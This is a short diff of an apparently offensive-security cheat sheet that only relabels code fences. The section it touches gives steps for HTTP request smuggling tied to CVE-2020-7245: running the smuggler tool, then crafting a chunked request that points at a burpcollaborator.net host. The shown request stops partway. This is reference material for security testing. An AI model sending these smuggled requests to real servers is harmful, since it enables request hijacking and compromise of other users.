@@ -110,18 +110,18 @@ See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
 
 Refer to **HTTP Request Smuggling** vulnerability page.
 1. Use **smuggler** to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)
-    ```powershell
+    ```bash
     git clone https://github.com/defparam/smuggler.git
     cd smuggler
     python3 smuggler.py -h
     ```
 2. Craft a request which will overwrite the `POST / HTTP/1.1` with the following data:
-    ```powershell
+    ```http
     GET http://something.burpcollaborator.net  HTTP/1.1
     X: 
     ```
 3. Final request could look like the following
-    ```powershell
+    ```http
     GET /  HTTP/1.1
     Transfer-Encoding: chunked
     Host: something.com
